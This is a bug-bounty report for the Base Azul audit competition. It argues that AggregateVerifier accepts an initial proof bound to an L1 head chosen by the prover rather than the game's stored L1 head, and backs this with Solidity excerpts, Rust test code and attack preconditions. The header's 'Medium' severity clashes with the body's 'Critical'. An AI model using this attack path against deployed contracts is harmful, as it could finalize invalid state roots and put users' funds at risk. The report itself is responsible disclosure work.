# 76321 sc medium supplemental technical correction for report 76106 improper l1 head binding in aggregateverifier initial proof verification can finalize an invalid state root on l1

**Submitted on May 3rd 2026 at 20:38:40 UTC by @Singapore\_Lion for** [**Audit Comp | Base Azul**](https://immunefi.com/audit-competition/audit-comp-base-azul)

* **Report ID:** #76321
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/base/contracts/tree/v8.1.0/src/multiproof>
* **Impacts:**
  * Forging or bypassing TEE or ZK proof verification in AggregateVerifier to finalize an invalid state root on L1
  * Circumventing the dispute/challenge mechanism to prevent correction of an invalid proposal before finalization
  * Forcing a dispute game into an incorrect resolved state (e.g., DEFENDER\_WINS when CHALLENGER\_WINS should apply, or vice versa)

## Description

## Submission Note

This submission is a supplemental technical correction for previously closed Base Azul Audit Competition Report #76106.

It is being submitted separately only because the original report is closed, the mediation UI says mediation is unavailable, and Immunefi Support has not responded before the competition deadline.

If possible, please merge this evidence into Report #76106 and reassess that report rather than treating this as an unrelated new finding.

The project closed Report #76106 as "intended" with the following rationale:

```
The L1 head is to ensure that blob data was acquired from an actual L1 block.
It does not matter which L1 block was used. As long as proofs attest to the correct
L2 block number and state root, the L1 head is irrelevant.
```

The new supplemental Base action-harness PoC below directly disproves that closure premise. Base's own derivation harness shows that different L1 heads can produce different L2 safe heads when batch data exists between those L1 heads. Therefore, `l1_head` is not irrelevant metadata; it bounds the L1 data view used by derivation.

I also added focused proof-client tests for the ZK/Succinct path. These tests show that when the L1 data source is exhausted before the requested target, the proof-client derivation helper can return the current safe head as success, while the SP1 public-value struct still commits the requested `claimed_l2_block_number`. This is supplemental evidence against the statement that the L1 head is irrelevant as long as the proof attests a block number and state root.

## Brief / Intro

`AggregateVerifier.initializeWithInitData()` accepts an initial TEE or ZK proof whose public input is bound to a prover-chosen recent L1 head, instead of requiring that proof to be bound to the dispute game's stored `l1Head()`. As a result, a valid proof for L1 head `H_stale` can initialize a game whose immutable game context is `H_game = blockhash(block.number - 1)`. With `PROOF_THRESHOLD = 1`, this single mismatched proof is enough for the game to resolve and update `AnchorStateRegistry`, meaning the protocol can finalize an L2 output root on L1 that was never proven for the game's actual L1 context.

## Vulnerability Details

### Why this report is about a real production smart-contract bug

This report is not claiming forged cryptography, leaked keys, or a test-only issue.

It is about a production on-chain verification bug in `AggregateVerifier.sol`: the contract builds the initial proof journal using a proof-supplied L1 head, even though the dispute game itself already has an immutable stored L1 head. The vulnerable entrypoint is the public game creation path `DisputeGameFactory.createWithInitData()`, so the issue is reachable without admin privileges and is inside the in-scope implementation contracts.

The PoC therefore does not need to break SP1, RISC0, or Nitro signatures. It only needs to show the security-relevant contract behavior: `AggregateVerifier` passes the wrong journal context into the cryptographic verifier and then treats that proof as valid for the game.

No code comment, deployment note, or protocol documentation describes this mismatch as an intentional temporary compatibility behavior. The documented proof flow instead treats the dispute game's stored `l1Head()` as the binding game context for proof verification.

### Broken Invariant

For a dispute game with stored `l1Head() == H_game`, every proof accepted by that game must be bound to `H_game`.

`initializeWithInitData()` violates this invariant because it verifies the initial proof against `l1OriginHash` parsed from proof calldata, while the game stores a separate immutable `l1Head()`.

### Root cause

The root cause is a public-input / contract-state binding mismatch in `AggregateVerifier`.

`DisputeGameFactory` stores the dispute game's L1 head at creation time as the parent block hash:

```solidity
bytes32 parentHash = blockhash(block.number - 1);
proxy_ = IDisputeGame(address(impl).clone(abi.encodePacked(msg.sender, _rootClaim, parentHash, _extraData)));
```

However, `AggregateVerifier.initializeWithInitData()` does not bind the initial proof to that stored `l1Head()`. Instead, it parses a proof-supplied L1 origin directly from calldata:

```solidity
ProofType proofType = ProofType(uint8(proof[0]));

bytes32 l1OriginHash = bytes32(proof[1:33]);
uint256 l1OriginNumber = uint256(bytes32(proof[33:65]));
_verifyL1Origin(l1OriginHash, l1OriginNumber);

_verifyProof(
    proof[65:],
    proofType,
    gameCreator(),
    l1OriginHash,
    startingOutputRoot.root.raw(),
    uint64(startingOutputRoot.l2SequenceNumber),
    rootClaim().raw(),
    uint64(l2SequenceNumber()),
    intermediateOutputRoots()
);
```

`_verifyL1Origin()` only checks that `l1OriginHash` matches a recent canonical L1 block hash. It does not require `l1OriginHash == l1Head().raw()`.

That is inconsistent with the later proof path in the same contract. `verifyProposalProof()` binds subsequent proofs to the stored game L1 head:

```solidity
_verifyProof(
    proofBytes[1:],
    proofType,
    msg.sender,
    l1Head().raw(),
    startingOutputRoot.root.raw(),
    uint64(startingOutputRoot.l2SequenceNumber),
    rootClaim().raw(),
    uint64(l2SequenceNumber()),
    intermediateOutputRoots()
);
```

The TEE and ZK verifiers both receive a journal digest that includes the chosen L1 head:

```solidity
bytes32 journal = keccak256(
    abi.encodePacked(
        proposer,
        l1OriginHash,
        startingRoot,
        startingL2SequenceNumber,
        endingRoot,
        endingL2SequenceNumber,
        intermediateRoots,
        CONFIG_HASH,
        TEE_IMAGE_HASH // or ZK_RANGE_HASH
    )
);
```

So the contract is not merely storing inconsistent metadata. It is actually asking the cryptographic verifier to validate the proof for `H_stale`, then recording that proof as the accepted initial proof for a game whose immutable L1 context is `H_game`.

### Why the L1 head is security-critical

This matters because Base's proof pipeline treats `l1_head` as trust-critical derivation context:

* Base's fault-proof specification states that `l1_head` is the L1 block hash perceived as the tip of the L1 chain, and that no later L1 data is available to the proof program.
* The proof client constructs `OracleL1ChainProvider::new(boot.l1_head, ...)`, so derivation is parameterized by that head.
* `OracleL1ChainProvider` starts header traversal from `self.l1_head` and rejects by-number queries above that header with `BlockNumberPastHead`.
* The prover request model carries an optional pinned `l1_head`; the service validates it, stores it with the proof request, and passes it into witness generation.
* The ZK boot/public values include `l1Head`, and the aggregation program commits `l1Head` into the final aggregation output digest.
* The Nitro enclave derives `l1_origin_hash` from `boot_info.l1_head` and includes it in the signed `ProofJournal`.
* Base's proof docs and proof encoder explicitly treat the game's stored `l1Head()` as the L1 context for `verifyProposalProof()`, `challenge()`, and `nullify()`.

That means the proof statement is effectively: "this output root is valid under this L1 head." The contract bug changes the accepted on-chain statement into: "this output root is valid under some recent L1 head chosen by the prover, but it will be treated as a proof for the game's stored L1 head."

This last point is important for the closure rationale. Base's own docs say that `verifyProposalProof(proofBytes)` does not re-read a new L1 origin from calldata and instead uses the `l1Head()` captured by the factory at clone creation. The proof encoder says the compact proof bytes for `AggregateVerifier.nullify()`, `challenge()`, and `verifyProposalProof()` omit `l1OriginHash` and `l1OriginNumber` because those entrypoints already have `l1Head` stored in CWIA. In other words, the documented non-initial proof flow already assumes the L1 head is the stored game context, not arbitrary irrelevant metadata.

### Supplemental evidence: Base action-harness disproves that `l1_head` is irrelevant

After Report #76106 was closed, I created an additional Base action-harness test to directly test the project's closure rationale.

The test uses Base's own derivation/action harness and shows that two derivation runs with the same starting state and the same sequencer-built L2 block produce different L2 safe heads when the L1 view is capped at different L1 heads:

1. `H_stale`: the L1 view is capped at genesis, before the L1 block containing the batch data.
2. `H_game`: the L1 view includes L1 block 1, which contains the batch data for the same sequencer-built L2 block.
3. Under `H_stale`, derivation cannot see the batch-bearing L1 block and remains at L2 genesis.
4. Under `H_game`, derivation sees the batch-bearing L1 block and derives L2 block 1.
5. The resulting L2 safe heads differ.

This directly contradicts the closure claim that "it does not matter which L1 block was used." It matters whenever relevant L1 data, such as batch data, deposits, or other derivation inputs, exists between the two L1 heads.

Action-harness PoC file:

```
actions/harness/tests/l1_head_relevance.rs
```

Full action-harness PoC code:

```rust
//! Action test showing that the selected L1 head changes derivation visibility.
//!
//! The same sequencer-built L2 block is submitted as calldata in L1 block 1.
//! A verifier whose L1 view is capped at genesis cannot see that batch and
//! remains at L2 genesis. A verifier whose L1 view includes block 1 derives
//! the L2 block. This is the production derivation meaning of `l1_head`: it is
//! the tip of the L1 data view, not irrelevant metadata.

use base_action_harness::{
    ActionL2Source, ActionTestHarness, Batcher, BatcherConfig, L1MinerConfig, SharedL1Chain,
    TestRollupConfigBuilder,
};
use base_batcher_encoder::{DaType, EncoderConfig};

#[tokio::test]
async fn stale_l1_head_cannot_derive_batch_visible_at_later_l1_head() {
    let batcher_cfg = BatcherConfig {
        encoder: EncoderConfig { da_type: DaType::Calldata, ..EncoderConfig::default() },
        ..BatcherConfig::default()
    };
    let rollup_cfg = TestRollupConfigBuilder::base_mainnet(&batcher_cfg).build();
    let mut h = ActionTestHarness::new(L1MinerConfig::default(), rollup_cfg);

    // H_stale: a verifier/proof view capped at L1 genesis, before the batch is included.
    let stale_l1_view = SharedL1Chain::from_blocks(h.l1.chain().to_vec());
    assert_eq!(stale_l1_view.tip().expect("genesis exists").number(), 0);

    // Build the exact L2 block that will be submitted to L1.
    let sequencer_l1_view = SharedL1Chain::from_blocks(h.l1.chain().to_vec());
    let mut sequencer = h.create_l2_sequencer(sequencer_l1_view);
    let l2_block = sequencer.build_next_block_with_single_transaction().await;

    // Mine L1 block 1 containing the batch data for that L2 block.
    let mut source = ActionL2Source::new();
    source.push(l2_block);
    Batcher::new(source, &h.rollup_config, batcher_cfg.clone()).advance(&mut h.l1).await;

    // H_game: a later verifier/proof view that includes the batch-bearing L1 block.
    let game_l1_view = SharedL1Chain::from_blocks(h.l1.chain().to_vec());
    assert_eq!(game_l1_view.tip().expect("post-batch head exists").number(), 1);

    // With H_stale, the derivation pipeline cannot see L1 block 1, so it cannot
    // derive the L2 block whose batch was included there.
    let (mut stale_node, _) =
        h.create_test_rollup_node_from_sequencer(&mut sequencer, stale_l1_view);
    stale_node.initialize().await;
    let stale_derived = stale_node.run_until_idle().await;
    assert_eq!(stale_derived, 0, "stale L1 head cannot see the batch-bearing L1 block");
    assert_eq!(stale_node.l2_safe_number(), 0, "stale view remains at L2 genesis");

    // With H_game, the exact same batch is visible, so derivation advances to L2 block 1.
    let (mut game_node, _) = h.create_test_rollup_node_from_sequencer(&mut sequencer, game_l1_view);
    game_node.initialize().await;
    let game_derived = game_node.run_until_idle().await;
    assert_eq!(game_derived, 1, "later L1 head sees the batch and derives it");
    assert_eq!(game_node.l2_safe_number(), 1, "later L1 head reaches L2 block 1");

    let game_safe = game_node.safe_head_at_l1(1).await.expect("safe head recorded for L1 block 1");
    assert_eq!(game_safe.safe_head.number, 1, "L1 block 1 maps to derived L2 block 1");

    assert_ne!(
        stale_node.l2_safe().block_info.hash,
        game_node.l2_safe().block_info.hash,
        "different L1 data views produce different L2 safe heads"
    );
}
```

Run command:

```bash
cargo test -p base-action-harness --test l1_head_relevance -- --nocapture
```

Observed passing output:

```
running 1 test
test stale_l1_head_cannot_derive_batch_visible_at_later_l1_head ... ok

test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out; finished in 1.86s
```

This test is intentionally independent from the Solidity mock-verifier PoC below. The Solidity PoC proves that `AggregateVerifier.initializeWithInitData()` accepts a mismatched proof context. The Base action-harness PoC proves that the mismatched proof context is security-relevant because the selected `l1_head` changes the L1 data view and can change the derived L2 safe head.

### Supplemental evidence: proof-client target binding in the ZK path

I added three focused local Rust tests to Base's proof-client code to check the follow-up claim that the L1 head is irrelevant "as long as proofs attest to the correct L2 block number and state root."

The relevant production code path is:

1. `WitnessExecutor::run()` calls the Succinct `advance_to_target()` helper with `Some(boot.claimed_l2_block_number)`.
2. If the derivation data source is exhausted, `advance_to_target()` sets the requested target to the current safe-head number and then returns `Ok((safe_head, output_root, intermediate_roots))`.
3. `WitnessExecutor::run()` then checks only `output_root == boot.claimed_l2_output_root`. It does not assert `safe_head.block_info.number == boot.claimed_l2_block_number`.
4. `BootInfoStruct::new()` commits `l2BlockNumber: boot_info.claimed_l2_block_number` into the SP1 public values.

The tests prove those points directly:

* `base-proof-driver::core::tests::end_of_source_downgrades_requested_target_to_current_safe_head`
  * requests target L2 block `1`
  * simulates `PipelineError::EndOfSource`
  * observes successful return of safe head `0`
* `base-proof-succinct-client-utils::client::tests::succinct_advance_to_target_accepts_end_of_source_before_requested_target`
  * repeats the same behavior through the Succinct helper using Base mainnet rollup config
  * observes successful return of safe head `0` for requested target `1`
* `base-proof-succinct-client-utils::boot::tests::boot_info_struct_commits_claimed_target_block_number`
  * constructs SP1 public values with actual pre/safe-head number `0`
  * confirms `l2BlockNumber` is still the requested `claimed_l2_block_number` `1`

This is not presented as a separate impacted asset claim. It is supporting proof-pipeline evidence for the in-scope smart-contract bug: the L1 head is derivation context, and the proof pipeline relies on correct binding between the claimed L2 statement and the L1 data view.

Proof-client test locations:

```
crates/proof/driver/src/core.rs
crates/proof/succinct/utils/client/src/client.rs
crates/proof/succinct/utils/client/src/boot.rs
```

Run commands:

```bash
cargo test -p base-proof-driver end_of_source_downgrades_requested_target_to_current_safe_head -- --nocapture
cargo test -p base-proof-succinct-client-utils target -- --nocapture
```

Observed passing output:

```
running 1 test
test core::tests::end_of_source_downgrades_requested_target_to_current_safe_head ... ok

test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out

running 2 tests
test boot::tests::boot_info_struct_commits_claimed_target_block_number ... ok
test client::tests::succinct_advance_to_target_accepts_end_of_source_before_requested_target ... ok

test result: ok. 2 passed; 0 failed; 0 ignored; 0 measured; 16 filtered out
```

Full proof-client test patch:

```diff
diff --git a/crates/proof/driver/Cargo.toml b/crates/proof/driver/Cargo.toml
index 58219f5..1fcbbfb 100644
--- a/crates/proof/driver/Cargo.toml
+++ b/crates/proof/driver/Cargo.toml
@@ -48,3 +48,6 @@ std = [
 	"thiserror/std",
 	"tracing/std",
 ]
+
+[dev-dependencies]
+tokio = { workspace = true, features = ["macros", "rt"] }
diff --git a/crates/proof/driver/src/core.rs b/crates/proof/driver/src/core.rs
index 2db6e88..e61e3fa 100644
--- a/crates/proof/driver/src/core.rs
+++ b/crates/proof/driver/src/core.rs
@@ -179,3 +179,172 @@ where
         }
     }
 }
+
+#[cfg(test)]
+mod tests {
+    use alloc::{sync::Arc, vec::Vec};
+    use core::fmt;
+
+    use alloy_consensus::{Header, Sealable, Sealed};
+    use alloy_primitives::B256;
+    use async_trait::async_trait;
+    use base_common_genesis::{RollupConfig, SystemConfig};
+    use base_common_rpc_types_engine::BasePayloadAttributes;
+    use base_consensus_derive::{
+        Pipeline, PipelineError, PipelineErrorKind, PipelineResult, Signal, SignalReceiver,
+        StepResult,
+    };
+    use base_proof_executor::BlockBuildingOutcome;
+    use base_protocol::{AttributesWithParent, BlockInfo, L2BlockInfo};
+    use spin::RwLock;
+
+    use super::Driver;
+    use crate::{DriverPipeline, Executor, PipelineCursor, TipCursor};
+
+    #[derive(Debug)]
+    struct MockExecutorError;
+
+    impl fmt::Display for MockExecutorError {
+        fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
+            f.write_str("mock executor error")
+        }
+    }
+
+    impl core::error::Error for MockExecutorError {}
+
+    #[derive(Debug, Default)]
+    struct MockExecutor;
+
+    #[async_trait]
+    impl Executor for MockExecutor {
+        type Error = MockExecutorError;
+
+        async fn wait_until_ready(&mut self) {}
+
+        fn update_safe_head(&mut self, _header: Sealed<Header>) {}
+
+        async fn execute_payload(
+            &mut self,
+            _attributes: BasePayloadAttributes,
+        ) -> Result<BlockBuildingOutcome, Self::Error> {
+            unreachable!("the exhausted pipeline must not produce executable payloads")
+        }
+
+        fn compute_output_root(&mut self) -> Result<B256, Self::Error> {
+            unreachable!("the exhausted pipeline must not execute blocks")
+        }
+    }
+
+    #[derive(Debug)]
+    struct ExhaustedPipeline {
+        origin: BlockInfo,
+        rollup_config: RollupConfig,
+    }
+
+    impl ExhaustedPipeline {
+        fn new(origin: BlockInfo) -> Self {
+            Self { origin, rollup_config: RollupConfig::default() }
+        }
+    }
+
+    impl Iterator for ExhaustedPipeline {
+        type Item = AttributesWithParent;
+
+        fn next(&mut self) -> Option<Self::Item> {
+            None
+        }
+    }
+
+    #[async_trait]
+    impl Pipeline for ExhaustedPipeline {
+        fn peek(&self) -> Option<&AttributesWithParent> {
+            None
+        }
+
+        async fn step(&mut self, _cursor: L2BlockInfo) -> StepResult {
+            StepResult::StepFailed(PipelineError::EndOfSource.crit())
+        }
+
+        fn rollup_config(&self) -> &RollupConfig {
+            &self.rollup_config
+        }
+
+        async fn system_config_by_number(
+            &mut self,
+            _number: u64,
+        ) -> Result<SystemConfig, PipelineErrorKind> {
+            Ok(SystemConfig::default())
+        }
+    }
+
+    impl base_consensus_derive::OriginProvider for ExhaustedPipeline {
+        fn origin(&self) -> Option<BlockInfo> {
+            Some(self.origin)
+        }
+    }
+
+    #[async_trait]
+    impl SignalReceiver for ExhaustedPipeline {
+        async fn signal(&mut self, _signal: Signal) -> PipelineResult<()> {
+            Ok(())
+        }
+    }
+
+    #[async_trait]
+    impl DriverPipeline<ExhaustedPipeline> for ExhaustedPipeline {
+        fn flush(&mut self) {}
+
+        async fn produce_payload(
+            &mut self,
+            _l2_safe_head: L2BlockInfo,
+        ) -> Result<AttributesWithParent, PipelineErrorKind> {
+            Err(PipelineError::EndOfSource.crit())
+        }
+    }
+
+    fn block_info(byte: u8, number: u64) -> BlockInfo {
+        BlockInfo::new(B256::repeat_byte(byte), number, B256::repeat_byte(byte.wrapping_sub(1)), 0)
+    }
+
+    fn l2_info(number: u64, origin: BlockInfo) -> L2BlockInfo {
+        L2BlockInfo::new(block_info(0x20 + number as u8, number), origin.id(), 0)
+    }
+
+    #[tokio::test]
+    async fn end_of_source_downgrades_requested_target_to_current_safe_head() {
+        let origin = block_info(0x11, 10);
+        let safe_head = l2_info(0, origin);
+        let safe_head_output_root = B256::repeat_byte(0x33);
+        let safe_head_header = Header { number: 0, ..Default::default() }.seal_slow();
+
+        let mut pipeline_cursor = PipelineCursor::new(0, origin);
+        pipeline_cursor.advance(
+            origin,
+            TipCursor::new(safe_head, safe_head_header, safe_head_output_root),
+        );
+
+        let cursor = Arc::new(RwLock::new(pipeline_cursor));
+        let mut driver = Driver::<MockExecutor, ExhaustedPipeline, ExhaustedPipeline>::new(
+            cursor,
+            MockExecutor,
+            ExhaustedPipeline::new(origin),
+        );
+        let mut derived_blocks: Vec<(L2BlockInfo, B256)> = Vec::new();
+
+        let requested_target = 1;
+        let (returned_safe_head, returned_root) = driver
+            .advance_to_target(&RollupConfig::default(), Some(requested_target), |info, root| {
+                derived_blocks.push((info, root));
+            })
+            .await
+            .expect("EndOfSource is treated as successful derivation halt");
+
+        assert!(derived_blocks.is_empty(), "no block was derived before EndOfSource");
+        assert_eq!(returned_safe_head.block_info.number, 0);
+        assert_eq!(returned_root, safe_head_output_root);
+        assert!(
+            returned_safe_head.block_info.number < requested_target,
+            "driver returned an earlier safe head than the requested target"
+        );
+    }
+}
diff --git a/crates/proof/succinct/utils/client/Cargo.toml b/crates/proof/succinct/utils/client/Cargo.toml
index 89a3b06..80cd3cc 100644
--- a/crates/proof/succinct/utils/client/Cargo.toml
+++ b/crates/proof/succinct/utils/client/Cargo.toml
@@ -49,6 +49,8 @@ cfg-if.workspace = true
 
 [dev-dependencies]
 base-common-chains.workspace = true
+base-common-rpc-types-engine.workspace = true
+tokio = { workspace = true, features = ["macros", "rt"] }
 
 [lints]
 workspace = true
diff --git a/crates/proof/succinct/utils/client/src/boot.rs b/crates/proof/succinct/utils/client/src/boot.rs
index 190c67b..e885a88 100644
--- a/crates/proof/succinct/utils/client/src/boot.rs
+++ b/crates/proof/succinct/utils/client/src/boot.rs
@@ -59,8 +59,9 @@ impl BootInfoStruct {
 
 #[cfg(test)]
 mod tests {
-    use alloy_primitives::b256;
+    use alloy_primitives::{Address, B256, b256};
     use base_common_chains::Registry;
+    use base_proof::BootInfo;
 
     use super::*;
 
@@ -81,4 +82,34 @@ mod tests {
             assert_eq!(got, expected, "config hash mismatch for chain {chain_id}");
         }
     }
+
+    #[test]
+    fn boot_info_struct_commits_claimed_target_block_number() {
+        let actual_safe_head_number = 0;
+        let requested_target_block_number = 1;
+        let claimed_output_root = B256::repeat_byte(0x33);
+
+        let public_values = BootInfoStruct::new(
+            BootInfo {
+                l1_head: B256::repeat_byte(0x11),
+                agreed_l2_output_root: B256::repeat_byte(0x22),
+                claimed_l2_output_root: claimed_output_root,
+                claimed_l2_block_number: requested_target_block_number,
+                chain_id: 8453,
+                rollup_config: Registry::rollup_config(8453).expect("missing Base rollup").clone(),
+                l1_config: Default::default(),
+                proposer: Address::ZERO,
+                intermediate_block_interval: 10,
+                l1_head_number: 10,
+            },
+            actual_safe_head_number,
+            Vec::new(),
+        );
+
+        assert_eq!(public_values.l2PreBlockNumber, actual_safe_head_number);
+        assert_eq!(public_values.l2BlockNumber, requested_target_block_number);
+        assert_eq!(public_values.l2PostRoot, claimed_output_root);
+        assert_ne!(public_values.l2BlockNumber, public_values.l2PreBlockNumber);
+        assert!(public_values.intermediateRoots.is_empty());
+    }
 }
diff --git a/crates/proof/succinct/utils/client/src/client.rs b/crates/proof/succinct/utils/client/src/client.rs
index 8ac07f0..c5b112c 100644
--- a/crates/proof/succinct/utils/client/src/client.rs
+++ b/crates/proof/succinct/utils/client/src/client.rs
@@ -201,3 +201,173 @@ where
         std::mem::forget(block);
     }
 }
+
+#[cfg(test)]
+mod tests {
+    use std::{fmt, sync::Arc};
+
+    use alloy_consensus::{Header, Sealable, Sealed};
+    use alloy_primitives::B256;
+    use async_trait::async_trait;
+    use base_common_chains::Registry;
+    use base_common_genesis::{RollupConfig, SystemConfig};
+    use base_common_rpc_types_engine::BasePayloadAttributes;
+    use base_consensus_derive::{
+        PipelineErrorKind, PipelineResult, Signal, StepResult,
+    };
+    use base_proof_driver::{Driver, DriverPipeline, Executor, PipelineCursor};
+    use base_proof_executor::BlockBuildingOutcome;
+    use base_protocol::{AttributesWithParent, BlockInfo, L2BlockInfo};
+    use spin::RwLock;
+
+    use super::*;
+
+    #[derive(Debug)]
+    struct MockExecutorError;
+
+    impl fmt::Display for MockExecutorError {
+        fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
+            f.write_str("mock executor error")
+        }
+    }
+
+    impl std::error::Error for MockExecutorError {}
+
+    #[derive(Debug, Default)]
+    struct MockExecutor;
+
+    #[async_trait]
+    impl Executor for MockExecutor {
+        type Error = MockExecutorError;
+
+        async fn wait_until_ready(&mut self) {}
+
+        fn update_safe_head(&mut self, _header: Sealed<Header>) {}
+
+        async fn execute_payload(
+            &mut self,
+            _attributes: BasePayloadAttributes,
+        ) -> Result<BlockBuildingOutcome, Self::Error> {
+            unreachable!("the exhausted pipeline must not produce executable payloads")
+        }
+
+        fn compute_output_root(&mut self) -> Result<B256, Self::Error> {
+            unreachable!("the exhausted pipeline must not execute blocks")
+        }
+    }
+
+    #[derive(Debug)]
+    struct ExhaustedPipeline {
+        origin: BlockInfo,
+        rollup_config: RollupConfig,
+    }
+
+    impl ExhaustedPipeline {
+        fn new(origin: BlockInfo, rollup_config: RollupConfig) -> Self {
+            Self { origin, rollup_config }
+        }
+    }
+
+    impl Iterator for ExhaustedPipeline {
+        type Item = AttributesWithParent;
+
+        fn next(&mut self) -> Option<Self::Item> {
+            None
+        }
+    }
+
+    #[async_trait]
+    impl Pipeline for ExhaustedPipeline {
+        fn peek(&self) -> Option<&AttributesWithParent> {
+            None
+        }
+
+        async fn step(&mut self, _cursor: L2BlockInfo) -> StepResult {
+            StepResult::StepFailed(PipelineError::EndOfSource.crit())
+        }
+
+        fn rollup_config(&self) -> &RollupConfig {
+            &self.rollup_config
+        }
+
+        async fn system_config_by_number(
+            &mut self,
+            _number: u64,
+        ) -> Result<SystemConfig, PipelineErrorKind> {
+            Ok(SystemConfig::default())
+        }
+    }
+
+    impl base_consensus_derive::OriginProvider for ExhaustedPipeline {
+        fn origin(&self) -> Option<BlockInfo> {
+            Some(self.origin)
+        }
+    }
+
+    #[async_trait]
+    impl SignalReceiver for ExhaustedPipeline {
+        async fn signal(&mut self, _signal: Signal) -> PipelineResult<()> {
+            Ok(())
+        }
+    }
+
+    #[async_trait]
+    impl DriverPipeline<ExhaustedPipeline> for ExhaustedPipeline {
+        fn flush(&mut self) {}
+
+        async fn produce_payload(
+            &mut self,
+            _l2_safe_head: L2BlockInfo,
+        ) -> Result<AttributesWithParent, PipelineErrorKind> {
+            Err(PipelineError::EndOfSource.crit())
+        }
+    }
+
+    fn block_info(byte: u8, number: u64) -> BlockInfo {
+        BlockInfo::new(B256::repeat_byte(byte), number, B256::repeat_byte(byte.wrapping_sub(1)), 0)
+    }
+
+    fn l2_info(number: u64, origin: BlockInfo) -> L2BlockInfo {
+        L2BlockInfo::new(block_info(0x20 + number as u8, number), origin.id(), 0)
+    }
+
+    #[tokio::test]
+    async fn succinct_advance_to_target_accepts_end_of_source_before_requested_target() {
+        let rollup_config = Registry::rollup_config(8453).expect("missing Base rollup").clone();
+        let origin = block_info(0x11, 10);
+        let safe_head = l2_info(0, origin);
+        let safe_head_output_root = B256::repeat_byte(0x33);
+        let safe_head_header = Header { number: 0, ..Default::default() }.seal_slow();
+
+        let mut pipeline_cursor = PipelineCursor::new(0, origin);
+        pipeline_cursor.advance(
+            origin,
+            TipCursor::new(safe_head, safe_head_header, safe_head_output_root),
+        );
+
+        let cursor = Arc::new(RwLock::new(pipeline_cursor));
+        let mut driver = Driver::<MockExecutor, ExhaustedPipeline, ExhaustedPipeline>::new(
+            cursor,
+            MockExecutor,
+            ExhaustedPipeline::new(origin, rollup_config.clone()),
+        );
+
+        let requested_target = 1;
+        let (returned_safe_head, returned_root, intermediate_roots) = advance_to_target(
+            &mut driver,
+            &rollup_config,
+            Some(requested_target),
+            DEFAULT_INTERMEDIATE_ROOT_INTERVAL,
+        )
+        .await
+        .expect("EndOfSource is treated as successful derivation halt");
+
+        assert!(intermediate_roots.is_empty(), "no roots were sampled after zero derived blocks");
+        assert_eq!(returned_safe_head.block_info.number, 0);
+        assert_eq!(returned_root, safe_head_output_root);
+        assert!(
+            returned_safe_head.block_info.number < requested_target,
+            "succinct client returned an earlier safe head than the requested target"
+        );
+    }
+}
```

### Why the closure rationale would only hold under a different proof design

The closure rationale would be correct only if `l1_head` were not used as a derivation boundary and the proof statement were fully independent of the selected L1 head.

For example, if the proof statement committed to a complete, independently canonicalized derivation transcript and `l1_head` were used only to prove that some blob or batch data came from some real L1 block, then the exact L1 head might be irrelevant.

That is not how Base's actual derivation/proof flow behaves. In the current flow, `l1_head` bounds the L1 data view available to derivation. Therefore, a proof generated under `H_stale` proves the output root under the L1 data view capped at `H_stale`; it is not generally equivalent to a proof generated under `H_game` when relevant L1 data exists between those heads.

The action-harness PoC above gives a concrete counterexample: the stale L1 view cannot see the batch-bearing L1 block and remains at L2 genesis, while the later L1 view sees that same batch and derives L2 block 1. The resulting safe heads differ.

## Impact Details

This is appropriately classified as Critical.

### Attack Preconditions

1. An attacker can create a game through `DisputeGameFactory.createWithInitData()`.
2. The attacker supplies a proof bound to a recent canonical L1 head `H_stale`.
3. `H_stale != game.l1Head()`.
4. `_verifyL1Origin()` accepts `H_stale` as recent and canonical.
5. The proof is valid for `H_stale`.
6. The active multiproof configuration allows the game to resolve once the proof threshold is met.
7. The accepted proof is then used to resolve the game and update `AnchorStateRegistry`.

An attacker can create a dispute game with stored L1 head `H_game`, but supply an initial proof whose public input is bound to another recent canonical L1 head `H_stale`. If the L1 data between `H_stale` and `H_game` changes derivation inputs such as batch data, deposits, or withdrawals, then the output root proven under `H_stale` can differ from the output root that should be required under `H_game`.

The proof remains cryptographically valid for `H_stale`; it is invalid only with respect to the game context. Nevertheless, `AggregateVerifier` accepts it as the game's initial proof. `AggregateVerifier` only allows thresholds `1` or `2`, and the referenced multiproof activation configs set `PROOF_THRESHOLD=1` for activation. Under that active configuration, one accepted mismatched initial proof is enough for the attacker to move the game to a valid resolved state and update `AnchorStateRegistry` using a root that was never proven against the dispute game's actual L1 head.

This is the key impact chain: the contract accepts a proof for `H_stale`, treats it as if it were a proof for `H_game`, and then finalizes the game on that basis. The bug is therefore not just an inconsistent input check. It is an on-chain proof-context bypass that can finalize an invalid state root on L1 with respect to the dispute game's actual context.

This directly matches the in-scope Critical impacts:

* `Forging or bypassing TEE or ZK proof verification in AggregateVerifier to finalize an invalid state root on L1`
* `Circumventing the dispute/challenge mechanism to prevent correction of an invalid proposal before finalization`

This is also distinct from the known Nitro certificate issues. It does not rely on `NitroEnclaveVerifier`, `trustedCertsPrefixLen`, certificate revocation, `_cacheNewCert()`, leaked keys, or invalid proofs. The bug is the on-chain failure to bind initial proof public input to the stored dispute-game state.

### Preemptive clarification on production impact and proof generation

This report does not require a forged proof or a malicious verifier. The exploit condition is that the attacker can provide a proof that is valid for `H_stale`. The contract bug is that `AggregateVerifier.initializeWithInitData()` accepts that proof as the initial proof for a game whose immutable stored context is `H_game`.

A production SP1 or TEE proof is not expected to prove an invalid statement under its own L1 head. The vulnerability is that a proof valid under one L1 head is accepted as if it were valid under another L1 head. A full production proof would only be needed to demonstrate a concrete divergent-root instance; it is not required to establish the on-chain public-input binding bug itself.

The Solidity PoC uses asserting verifier contracts only to prove which journal `AggregateVerifier` constructs and passes into verification. This is sufficient for the on-chain bug because the vulnerable behavior occurs before and around the verifier call: the contract chooses `l1OriginHash` from prover-controlled calldata as the proof context instead of using the stored `l1Head()`.

The supplemental Base action-harness PoC addresses the remaining security question: whether the selected L1 head is actually relevant to the proof statement. It shows that `l1_head` bounds the L1 data view available to derivation and can change the resulting L2 safe head. Therefore, a real proof for `H_stale` is not generally equivalent to a real proof for `H_game`.

The proof-client tests further address the "correct L2 block number" part of the closure rationale. They show that the ZK/Succinct client path does not simply make `l1_head` irrelevant by independently enforcing the requested target block against the actual derived safe head. The public-value struct commits the requested block number from `BootInfo`, while the derivation helper can return the current safe head when the selected L1 data view is exhausted.

